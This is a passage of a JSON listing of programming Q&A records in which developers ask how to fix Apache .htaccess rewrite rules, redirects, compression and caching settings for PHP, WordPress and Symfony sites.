/posthuman</p>\n\n<p>Here's the current .htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n\n    # route non-existant requests to single script\n    RewriteCond %{DOCUMENT_ROOT}/%{REQUEST_URI} !-f\n    RewriteRule ^.*$ index.php [QSA,NS]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>When I try to go to posthumanmovie.com - I get a 404 not found error.</p>\n\n<p>When I delete the .htaccess file, it works, but his other site ra-pictures.com has 404 errors on any page that isn't the index page.  Any ideas on how I can change the .htaccess file to allow access to all pages from both sites?</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":29,"score":2,"question_id":13041386,"title":"How can I fix my image paths in a .htaccess rewrite?","body":"<p>I've made a rewrite rule as follows:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^(/index.php)|(index.php)|\\.(gif|jpe?g|png)|(/public/)|(/forum/)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*) index.php?qs=$1\n</code></pre>\n\n<p>When one goes to say, <code>www.example.com/a/b</code>, everything is fine, except images.</p>\n\n<p>Images are linked as relative paths in my script, and they are located in <code>www.example.com/images</code>, but server is trying to load images from <code>www.example.com/a/b/images</code>. </p>\n\n<p>Is there a way to solve this problem by editing my RewriteRule? This would be an optimal soloution, because it's very hard to change all the image paths in my script.</p>\n"},{"tags":["php",".htaccess","url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13040726,"title":"PHP URL /?val=something","body":"<p>I was messing around on <a href=\"http://www.wolframalpha.com\" rel=\"nofollow\">WolframAlpha.com</a> today and noticed that you start out on the wolframalpha.com/index.html page then when you hit <code>enter</code> you get redirected to wolframalpha.com/input/?i=YourSearch</p>\n\n<p>I know how to set this up, <code>&lt;form action=\"newpage.php\" method=\"GET\" /&gt;</code> but with the project I'm working on, it would be cool if I could redirect to <code>example.com/?val=something</code> instead of <code>example.com/newpage.php?val=something</code> Is it possible to redirect to a file but have the page name hidden like WA has? Would this be a job for .htacess?</p>\n\n<p><strong>EDIT:</strong>\nI need to direct from index.php to pages/file.php without \"file.php\" showing up in the url of the browser. So if I were to say:</p>\n\n<pre><code>&lt;form action=\"pages/file.php\" method=\"GET\"&gt;\n    &lt;input type=\"text\" name=\"foo\" /&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>Then if would direct me to example.com/?foo=blah instead of example.com/pages/file.php?foo=blah</p>\n"},{"tags":["php",".htaccess","url","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13033210,"title":".htaccess rewrite not working for all URL's","body":"<p>I am developing a site and I am trying to rewrite URL's to make them nicer looking and to make them more accessible.</p>\n\n<p>First, in PHP, I am using rawurlencode and rawurldecode to sanitize URL's.</p>\n\n<p>Next, in my .htaccess file this is the RewriteRule I am using:</p>\n\n<pre><code>RewriteRule ^(/(/[^/]*/?)?)?([^/]+[a-zA-Z0-9])/(albums)/(.*)$ /name.php?name=$3&amp;page=photos&amp;album=$5 [L]\n</code></pre>\n\n<p>Firstly, this works perfectly with everything I have tried except one URL and I am not quite sure why as of yet.</p>\n\n<p>The URL in question is: <a href=\"https://domain.com/name/albums/album%3B.%2F\" rel=\"nofollow\">https://domain.com/name/albums/album%3B.%2F</a></p>\n\n<p>Now I have an ErrorDocument set up in my .htaccess and it is not even going to that document, which it normally does.  The 404 error is going to my domain hosts normal error page.  I am trying to figure out why this isn't working, as the URL is sanitized, so I am not sure what would be causing this issue.</p>\n\n<p>In case you're wondering the last part of the URL is encoded from \"album;./\"...</p>\n\n<p>If you have any suggestions as to how to fix this error that is being caused let me know.  I appreciate any replies in advance.</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":31,"score":2,"question_id":13031488,"title":"Rewrite a parameter into url (example.com?url=/about-us into example.com/about-us)","body":"<p>I have some URLs generated by a CMS (SilverStripe CMS) that I wish to rewrite.\nFor some reason it's possible to set a URL like by appending a <code>?url=</code> to the query string.</p>\n\n<p>So <code>example.com?url=/about-us</code> and <code>example.com/about-us</code> gives the same page.<br>\nYou can even do <code>example.com/some-page/?url=/about-us</code> and you will still get the about us page.</p>\n\n<p>So: How do I rewrite any URL that contains the parameter \"url\" into <code>domain.tld</code> + the value of the URL paramater? (<code>example.com?url=/about-us</code> and <code>example.com/some-page/?url=/about-us</code> and so on into <code>example.com/about-us</code>).</p>\n\n<p>Hope someone can help.</p>\n"},{"tags":["apache",".htaccess","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13029535,"title":"URL Rewriting and Redirecting with folders","body":"<p>I know there are lots of question on htaccess, yet I tried the different code I could find on Google and StackOverFlow, none worked.</p>\n\n<p>I have the following in my root :</p>\n\n<pre><code>index.php\n.htaccess (the one I am trying to write)\ncontrollers\n    --index.php\n    --mycontroller.php\nmodels\n    --mymodel.php\nview\n    -index.php\n    --myview.php\n</code></pre>\n\n<p>(I am working on localhost with MAMP&amp;Firefox)</p>\n\n<p>What I have is this link</p>\n\n<pre><code>localhost:8888/MySite/controllers/mycontroller.php\n</code></pre>\n\n<p>What I want is</p>\n\n<pre><code>localhost:8888/MySite/mycontroller\n</code></pre>\n\n<p>And when I manually enter the url, I would like it to be redirected to the right controller in my MVC code</p>\n\n<p>I tried this :</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^/(.*)$ /controllers/$1 [L]\n</code></pre>\n\n<p>It doesn't redirect when I go to blabla/controllers/mycontroller.php and doesn't understand what I am asking when I manual go to blabla/mycontroller.</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13038229,"title":"301 redirect from form action to URL with htaccess","body":"<p>I want to redirect an URL like this one:</p>\n\n<pre><code>/calculate?from=london&amp;to=paris\n</code></pre>\n\n<p>to other like this one:</p>\n\n<pre><code>/difference-london-paris\n</code></pre>\n\n<p>I tried this on my .htaccess file, but it doesn't work :(</p>\n\n<pre><code>RewriteRule ^calculate?from=(.*)&amp;to=(.*) ^difference-$1-$2 [R=301,L]\n</code></pre>\n\n<p>Thanks in advance for your help!</p>\n"},{"tags":[".htaccess","socialengine"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13038420,"title":"htaccess exception for folder, but GET not working","body":"<p>my site's root directory is socialengine, which has its own rewrite rules. i've configured .htaccess to ignore rewrite rules if the url is mydomain.com/sports, but now i suspect that the GET variables are not passing through. i did a vardump of $_GET and it seems to work sporadically... can anyone confirm that the exception for the sports directory will allow all GET variables to pass through? thanks!</p>\n\n<pre><code># $Id: .htaccess 7539 2010-10-04 04:41:38Z john $\n\n&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymLinks\n  RewriteEngine On\n\n  # Exception for sports directory\n  RewriteCond %{REQUEST_URI} \"/sports/\"\n  RewriteRule (.*) $1 [L,QSA]\n\n  # Get rid of index.php\n  RewriteCond %{REQUEST_URI} /index\\.php\n  RewriteRule (.*) index.php?rewrite=2 [L,QSA]  \n\n  # Rewrite all directory-looking urls\n  RewriteCond %{REQUEST_URI} /$\n  RewriteRule (.*) index.php?rewrite=1 [L,QSA]\n\n  # Try to route missing files\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} public\\/ [OR]\n  RewriteCond %{REQUEST_FILENAME} \\.(jpg|gif|png|ico|flv|htm|html|php|css|js)$\n  RewriteRule . - [L]\n\n  # If the file doesn't exist, rewrite to index\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^(.*)$ index.php?rewrite=1 [L,QSA]\n\n&lt;/IfModule&gt;\n\n# sends requests /index.php/path/to/module/ to \"index.php\"\n# AcceptPathInfo On\n\n# @todo This may not be effective in some cases\nFileETag Size\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","subdomain"],"answer_count":3,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":345,"score":0,"question_id":8490184,"title":".htaccess: mod-rewrite; subdomain","body":"<p>i am working on a new website bud i want to create a nice looking url for my users. I don't know anything of htaccess and could not find my solution on google.</p>\n\n<p>i need to link: \n<code>user.mywebsite.com</code> <strong>to>></strong> <code>mywebsite.com/users/user</code></p>\n\n<p>and:\n<code>user2.mywebsite.com/contact</code> <strong>to>></strong> <code>mywebsite.com/users/user2/contact</code></p>\n\n<p>some links may not be linked like: <code>www.mywebsite.com</code> may not link to <code>mywebsite.com/users/www</code> </p>\n\n<p>is this able with htaccess?\nif yes can someone explain it to me?</p>\n\n<p>Sander.</p>\n\n<p>( sorry for my poor english )</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13037561,"title":"How do I stop mod_rewrite from appending links to url?","body":"<p>I expect the answer is going to be something so simple I'll want to cry, but I can't seem to figure it out.  I'm new to mod_rewrite.</p>\n\n<p>I wanted to change my links from things like domain.com/?p=about to domain.com/about*<em>/</em>* (with the trailing slash) and it works fine, but whenever I move on to a link, it appends the new link to the back of the url.  For example, I have an about and a contact link.  If I click about it navigates to domain.com/about/ then if I click contact, it navigates to domain.com/about/contact/ and will keep adding the links to the end of the url.  If I'm at domain.com and click a link(about, in this case) it will go to domain.com/about/ and if I click about 4 more times, my address bar is going to say \"domain.com/about/about/about/about/about/\"  I have reproduced this in a very simple example below, what am I doing wrong?</p>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ([a-zA-Z0-9]+)/$ index.php?p=$1\n</code></pre>\n\n<p>index.php</p>\n\n<pre><code>&lt;a href=\"about/\"&gt;about&lt;/a&gt; | &lt;a href=\"contact/\"&gt;contact&lt;/a&gt;&lt;br&gt;&lt;br&gt;\n\n&lt;?php\n    if(!isset($_GET['p'])) {\n        echo \"home\";\n    } else {\n        echo $_GET['p'];\n    }\n?&gt;\n</code></pre>\n\n<p>Thank you for your help!</p>\n\n<p>edit:\nIt works okay if I use an absolute path, but I'd rather not if I don't absolutely have to.</p>\n\n<p>edit2: adding</p>\n\n<pre><code>RewriteBase /\n</code></pre>\n\n<p>breaks the links.  They appear to be going to domain.com/about/ and .../contact/, but I get a 404 - I'm assuming the rule I used is somehow incompatible with the way I'm doing my linking, which is why I included index.php as well.  </p>\n"},{"tags":["php",".htaccess","settings","php.ini"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13036500,"title":"Make php.ini file recursive on 1and1 hosting","body":"<p>I have my website hosted on 1and1 servers and I want to adjust some settings in a php.ini file. I can create the file and it is being interpreted correctly but only for the immediate directory not for any subdirectories. I would like to not have to copy the php.ini file into every single subdirectory. The only way I have seen to do this from googling is to add the following to the .htaccess file</p>\n\n<pre><code>suPHP_ConfigPath /path/to/htdocs/php.ini\n</code></pre>\n\n<p>I have an .htaccess file and the different directives I have in there are being interpreted correctly but when I add that line it causes a 500 Internal Server error. </p>\n\n<p>Can anyone suggest what I can do so that the php.ini settings are used in all the subdirectories without having to duplicate the php.ini file into all the subdirectories?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13035491,"title":"Why does my htaccess dislike this URL?","body":"<p>I hope someone can help me with this.</p>\n\n<p>This is my .htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>A URL like the following will successfully rewrite:</p>\n\n<pre><code>http://jobs2.local/main/out/16339404/http://www.google.com/\n</code></pre>\n\n<p>However if I encode the URL last part of the URL (the <a href=\"http://www.google.com/\" rel=\"nofollow\">http://www.google.com/</a> part) I get a 404 error:</p>\n\n<pre><code>http://jobs2.local/main/out/16339404/http%3A%2F%2Fwww.google.com%2F\n</code></pre>\n\n<p>The culprit appears to be the %2F but I do not understand why this is happening.</p>\n\n<p>Do any of you know what the problem is?</p>\n\n<p>Thank you.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13033703,"title":"Conditional .htaccess request_uri redirect (mod-rewrite)","body":"<p>On my Apache server, I'm moving an old domain to a new place, and it's going to share the same Apache setup as the previous one.</p>\n\n<p>Say I have two domains:</p>\n\n<ul>\n<li>example.com (old domain)</li>\n<li>example.net (new domain).</li>\n</ul>\n\n<p>If the request uri is the old domain then it should redirect to the new domain with its path such as <code>example.com/blog/great-post/</code> is 301 redirected to <code>example.net/blog/great-post/</code></p>\n\n<p>However if the request uri is <code>example.net/blog/great-post/</code> then it should not redirect to itself because it's already at its destination (and won't get stuck in a redirect loop).</p>\n"}]}
{"total":14527,"page":6,"pagesize":100,"questions":[{"tags":["php","javascript","ajax",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12999452,"title":"mod_rewrite strange behaviour when url with two subdirectories","body":"<p>I'm developing a web project with php, html5 and javascript. Right now I am using php to handle the URL when the user refresh the page in order to capture the subdirectories and recalculate the content of the page (it is needed because I'm using ajax).</p>\n\n<p>Ok, everithing works well on this manner, but to accomplish this I need to redirect every request to my page to index.php that calls another file called controller.php.\nTo do this I'm using the following .htaccess code:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{DOCUMENT_ROOT}/index\\.php -f\nRewriteRule ^(.*)$  /MySubDirectory/index.php [QSA]\n</code></pre>\n\n<p>I'm testing it on localhost, so for patterns following:</p>\n\n<pre><code>localhost/MySubDirectory/\nlocalhost/MySubDirectory/something\n</code></pre>\n\n<p>it works, but when I add a new folder:</p>\n\n<pre><code>localhost/MySubDirectory/something/somethingelse\n</code></pre>\n\n<p>I get weird errors on the css and javascript imports</p>\n\n<pre><code>Uncaught SyntaxError: Unexpected token &lt; jquery-1.8.2.min.js:1\nUncaught SyntaxError: Unexpected token &lt; jquery-ui-1.9.0.min.js:1\nUncaught SyntaxError: Unexpected token &lt; SpriteAnimation.js:1\nUncaught SyntaxError: Unexpected token &lt; Bile.js:1\n</code></pre>\n\n<p>Thanks for helping.</p>\n"},{"tags":["apache",".htaccess","compression"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13033281,"title":"Compression not working on web server?","body":"<p>When I run my website through <a href=\"https://developers.google.com/speed/pagespeed/insights\" rel=\"nofollow\">PageSpeed</a> I get this warning:</p>\n\n<pre><code>Enable compression\n\nCompressing resources with gzip or deflate can reduce the number of bytes sent over the network.\n\nSuggestions for this page\n\nCompressing the following resources with gzip could reduce their transfer size by 89.5KiB (66% reduction).\nCompressing http://enriquemorenotent.com/.../jquery.js?... could save 59.7KiB (64% reduction).\nCompressing http://enriquemorenotent.com/.../style.css?... could save 15KiB (78% reduction).\nCompressing http://enriquemorenotent.com/ could save 9KiB (73% reduction).\nCompressing http://enriquemorenotent.com/.../modernizr.js could save 3.7KiB (55% reduction).\nCompressing http://enriquemorenotent.com/.../wp-syntax.css?... could save 1.4KiB (68% reduction).\nCompressing http://enriquemorenotent.com/.../styles.css?... could save 551B (57% reduction).\n</code></pre>\n\n<p>But I already have it activated in my .htaccess:</p>\n\n<pre><code># ----------------------------------------------------------------------\n# Gzip compression\n# ----------------------------------------------------------------------\n\n&lt;IfModule mod_deflate.c&gt;\n\n  # Force deflate for mangled headers developer.yahoo.com/blogs/ydn/posts/2010/12/pushing-beyond-gzipping/\n  &lt;IfModule mod_setenvif.c&gt;\n    &lt;IfModule mod_headers.c&gt;\n      SetEnvIfNoCase ^(Accept-EncodXng|X-cept-Encoding|X{15}|~{15}|-{15})$ ^((gzip|deflate)\\s*,?\\s*)+|[X~-]{4,13}$ HAVE_Accept-Encoding\n      RequestHeader append Accept-Encoding \"gzip,deflate\" env=HAVE_Accept-Encoding\n    &lt;/IfModule&gt;\n  &lt;/IfModule&gt;\n\n  # Compress all output labeled with one of the following MIME-types\n  &lt;IfModule mod_filter.c&gt;\n    AddOutputFilterByType DEFLATE application/atom+xml \\\n                                  application/javascript \\\n                                  application/json \\\n                                  application/rss+xml \\\n                                  application/vnd.ms-fontobject \\\n                                  application/x-font-ttf \\\n                                  application/xhtml+xml \\\n                                  application/xml \\\n                                  font/opentype \\\n                                  image/svg+xml \\\n                                  image/x-icon \\\n                                  text/css \\\n                                  text/html \\\n                                  text/plain \\\n                                  text/x-component \\\n                                  text/xml\n  &lt;/IfModule&gt;\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>What am I missing?</p>\n"},{"tags":["php",".htaccess","symfony1","routing","symfony-1.4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13030183,"title":"Production server issue with symfony routing.yml","body":"<p>I've an existing project in symfony 1.4</p>\n\n<p>For few new static pages, I added few rules in routing.yml file. Added rules are</p>\n\n<pre><code>homepage:\n  url:   /\n  param: { module: page, action: index }\n\ncareer:\n  url:   /career\n  param: { module: page, action: career }\n\ncompany:\n  url:   /company\n  param: { module: page, action: company }\n\nfaq:\n  url:   /faq\n  param: { module: page, action: faq }\n\npresskit:\n  url:   /presskit\n  param: { module: page, action: presskit }\n\nprivacy:\n  url:   /privacy\n  param: { module: page, action: privacy }\n\nteam:\n  url:   /team\n  param: { module: page, action: team }\n\nterms:\n  url:   /terms\n  param: { module: page, action: terms }\n</code></pre>\n\n<p>On views/partials, I'm using <code>&lt;?PHP echo url_for('page/career') ?&gt;</code>, <code>&lt;?PHP echo url_for('page/index') ?&gt;</code> etc for navigation. It is working perfectly fine on local development box producing nav links <code>domain.com/career</code>, <code>domain.com/</code> respectively.</p>\n\n<p>However on production server, links in navigation were <code>domain.com/index.php/career</code>, <code>domain.com/index.php/</code> etc. Both development box and production server have same .htaccess file (Symfony 1.4 default .htaccess file). Can someone please suggest what could be the root cause?</p>\n"},{"tags":[".htaccess","rss"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13029974,"title":"Mime type for rss file generated by php?","body":"<p>I use php to auto generate an rss file from a database by putting some php commands in the rss file then changing the htaccess file in the rss directory so that the xml file will be parsed for php like this</p>\n\n<pre><code>AddType application/x-httpd-php .php .xml\n</code></pre>\n\n<p>But when i go to validate my feed it says the feed is valid but is being sent as a text file and I should change the htacces to include <code>AddType application/xml</code>. But when I add that after the php line, then the file won't execute the php commands in the file</p>\n\n<p>What's the best solution for this?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13028990,"title":"htaccess leverage browser caching for images and css","body":"<p>I am trying to create a htaccess file for my website and the pageSpeed insights has shown that there are images and one css file without expiration. </p>\n\n<p>I am not sure where to start with this or how to do it, I have this code from a tutorial online and was wondering if this would be enough to work. </p>\n\n<pre><code>&lt;IfModule mod_expires.c&gt;\nExpiresActive On\n############################################\n## Add default Expires header\n## http://developer.yahoo.com/performance/rules.html#expires\n&lt;FilesMatch \"\\.(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$\"&gt;\nExpiresDefault \"access plus 1 year\"\n&lt;/FilesMatch&gt;\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Or does this code do what I need it to do?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":24,"score":2,"question_id":13028430,"title":"Redirecting all access to a file to root","body":"<p>I would like to redirect all access to a file myfile.php to go to the root domain.</p>\n\n<p>So for example I would like the following URLs to all resolve to www.mydomain.tld :</p>\n\n<pre><code>www.mydomain.tld/myfile.php?Action=1&amp;k=a-value\nwww.mydomain.tld/myfile.php?Action=2&amp;k=parameter5\nwww.mydomain.tld/myfile.php?Action=parameters\nwww.mydomain.tld/myfile.php?Action=sitemap\n</code></pre>\n"},{"tags":["php",".htaccess","search","redirect","query-string"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13010249,"title":"How can I transform a query string generated by a search form into new URL without the query string?","body":"<p>I have a search form that on submit generates something like this url:</p>\n\n<pre><code>http://mydomain.com/index.php?find=some+text\n</code></pre>\n\n<p>And I'm aiming to make it look like:</p>\n\n<pre><code>http://mydomain.com/find/some+text\n</code></pre>\n\n<p>How can I do this with .htaccess ?</p>\n\n<p>So far I have this:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI}  ^/index\\.php$\nRewriteCond %{QUERY_STRING} &amp;?find=(.*)&amp;?\nRewriteRule ^index.php$ find/%1? [R=301,L]\n\nRewriteRule ^find/(.*)$ index.php?find=$1 [L]\n</code></pre>\n\n<p>This works if the query (i.e what I search for) contains only numbers, letters or underscore, but I want to make it capable of search for anything including spaces and other characters!</p>\n"},{"tags":[".htaccess","redirect","wildcard"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":13028050,"title":"Subdomain wildcard htaccess redirection to new domain","body":"<p>One of my websites I want to redirect o another domain.</p>\n\n<p>The situation:</p>\n\n<p>[old] *.example.com\n[new] *.example.net</p>\n\n<p>for now I have this in my htaccess</p>\n\n<pre><code>#RewriteCond %{HTTP_HOST} ^(.*).allwebsitestats.com [NC]\n#RewriteRule ^(.*)$ http://$1.allwebsitestats.nl [R=301,L]\n</code></pre>\n\n<p>The result of this;</p>\n\n<p>Request [old] *.example.com results in [new] .example.net, the problem is\nit doesn't get the wildcard subdomain with it.</p>\n\n<p>Thanks you!</p>\n\n<p>Regards,\nNick</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13026452,"title":"htaccess rewriting url with periods","body":"<p>I have the following </p>\n\n<blockquote>\n  <p>domain.com/products/consumables/jetty 0.18mm</p>\n</blockquote>\n\n<p>the </p>\n\n<blockquote>\n  <p>jetty 0.18mm</p>\n</blockquote>\n\n<p>gets picked up by PHP and taken into mysql to pull the product data and display it all onto the page.</p>\n\n<p>Only problem is, the . in 0.18 kills the search as the url thinks its an extension.</p>\n\n<p>How can I rewrite using htaccess to pick up any . in the last part of my url and then rewrite it so that it can work?</p>\n\n<p>Im clueless with htaccess and help would be greatly appreciated.</p>\n\n<p><strong>Current HTACCESS</strong></p>\n\n<pre><code>RewriteEngine On \n\nRewriteRule ^([^/.]*)/([^/.]*)$ index.php?c=$1&amp;p=$2 [L]\n\nRewriteRule ^([^/.]*)$ index.php?c=$1 [L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13027275,"title":".htaccess redirect conception, two different rules","body":"<p>I'm developing some page, and I've problem with conception of htaccess redirections (I'm new in this area), now I have such links:</p>\n\n<pre><code>domain/lng/en/pageTag/page:pageTag/\n</code></pre>\n\n<p>.htacces is now:</p>\n\n<pre><code>RewriteRule !^index.php - [C]\nRewriteRule (.*) index.php?$0\nRewriteCond %{QUERY_STRING} ([^/]+)/([^/]+)/(.*)\nRewriteRule ^index\\.php$ index.php?%1=%2&amp;%3 [N]\n</code></pre>\n\n<p>It's working ok, and could stay in that form, but we want so called \"pretty\" (short) links </p>\n\n<pre><code>domain/pageTag\n</code></pre>\n\n<p>Any ideas how to change .htaccess so links will work in old and new form?</p>\n\n<p>Any tips/tricks/help would be very much appreciated</p>\n"},{"tags":[".htaccess","rewrite","uppercase","lowercase"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13025650,"title":"Rewrite /SUBDIRECTORY to /subdirectory","body":"<p>I want to make it so that if a visitor navigates to:</p>\n\n<pre><code>http://www.website.com/folder\n</code></pre>\n\n<p>They get redirected to:</p>\n\n<pre><code>http://www.website.com/FOLDER\n</code></pre>\n\n<p>It is only for this specific folder that I want to affect (or intend to).</p>\n\n<p>I have tried:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /FOLDER/\nRewriteRule ^folder(/.*)?$ /FOLDER$1 [L,R=301]\n</code></pre>\n\n<p>But I don't think that is right</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13024294,"title":"How to add an exception to a mod_rewrite rule (wordpress site)","body":"<p>I have a WordPress website im trying to call a php script that is located on the website the URL is something like this</p>\n\n<p><a href=\"http://example.com/folder/process.php\" rel=\"nofollow\">http://example.com/folder/process.php</a> </p>\n\n<p>The problem is when I try to do this i always get redirected to the themes \"not found\" page.\nThis is the htaccess file </p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>If i put a test.html file in that directory it will work, and show the contents of the .html file. I think it has something to do with the .php extension it doesn't like?</p>\n\n<p>If i call example.com/wp-config.php it finds that file and deosnt show a 404 page..</p>\n"},{"tags":[".htaccess","url","magento","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12984595,"title":"Magento SEO URL's suddenly changed, can't reenable","body":"<p>I’m fairly new to the Magento platform but I have a decent amount of experience in web development on apache servers.</p>\n\n<p>A few days ago I was asked to look into an issue that was first made aware of with failing filters.</p>\n\n<p>I had a look at the google analytics data and it seems the SEO friendly URLs have all stopped displaying. The navigation URLs still use friendly words however on the page return the URL is redirected to a basic catalog URL.</p>\n\n<p><a href=\"http://www.camera-camera.com/cameras-and-accessories.html\" rel=\"nofollow\">http://www.camera-camera.com/cameras-and-accessories.html</a></p>\n\n<p>instead now it goes to</p>\n\n<p><a href=\"https://www.camera-camera.com/index.php/catalog/category/view/id/9\" rel=\"nofollow\">https://www.camera-camera.com/index.php/catalog/category/view/id/9</a></p>\n\n<p>I checked the admin config. The Web > SEO URL rewrites are set to YES \nI toggled them to No saved and back to yes then saved. Tried clearing the catalog URL rewrite cache</p>\n\n<p>Checked the htaccess file and it hasn’t been touched for months.</p>\n\n<p>Emptied the core rewrite table and reindexed it.</p>\n\n<p>So I’m outta ideas now, was hoping some of you more experienced users can have some input as to what else I can check.</p>\n\n<p>I also found it strange that the URL is now ignoring postback parameters. If you look at their filters they are simply an a link to the same page with a post parameter. This gets striped and ignored now might be related?</p>\n\n<p>A file restore was on the day it happened.  Any files I should check it against?</p>\n\n<p>Thanks for any help you can provide ! </p>\n"},{"tags":[".htaccess","redirect","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13024858,"title":"Redirect specific URLs by analyzing the querystring using htaccess","body":"<p>On my current website I use parameters in querystrings to select the content shown to the user (e.g. www.domain.tld/index.php?site=linklist&amp;page=2). I want to switch to wordpress and have all old links redirected to the new permalinks of wordpress.</p>\n\n<p>When having <code>site=linklist</code> in the query string the user should be redirected to www.domain.tld/my-new-linklist . If the querystring contains <code>site=about</code> the user should be redirected to www.domain.tld/about-me ,...</p>\n\n<p>How can I realize this using htaccess?</p>\n"},{"tags":["apache",".htaccess","ssl","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13024810,"title":"Redirect with htaccess (again) - including SSL and canonical url","body":"<p>I have a main site @ sitename.com which I need to enforce SSL and ensure the 'www' is removed if present.  This works with the following .htaccess:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST}//s%{HTTPS} ^www.(.*)//((s)on|s.*)$ [NC]\nRewriteRule ^ http%3://%1%{REQUEST_URI} [R=301]\n\nSSLOptions +StrictRequire\nSSLRequireSSL\nSSLRequire %{HTTP_HOST} eq \"sitename.com\"\nErrorDocument 403 https://sitename.com\n</code></pre>\n\n<p>However this breaks the redirects for subdomains i.e. subdomain.sitename.com now redirects to sitename.com.</p>\n\n<p>Is there a simple addition to the htaccess that will force the subdomain to non-ssl and to the correct location without breaking the other logic?</p>\n\n<p>I tried </p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^subdomain\\.* [NC]\nRewriteRule ^ http://subdomain.sitename.com [L]\n</code></pre>\n\n<p>at the top of the htaccess, but this had no effect.</p>\n"},{"tags":[".htaccess","http","redirect","ssl","https"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13024273,"title":"HTTPS to HTTP for all but a few pages and scripts","body":"<p>I'm trying to help a friend whose client knee-jerked her whole site into SSL after a hacking attempt. It's wreaking havoc w/ her SEO, causing 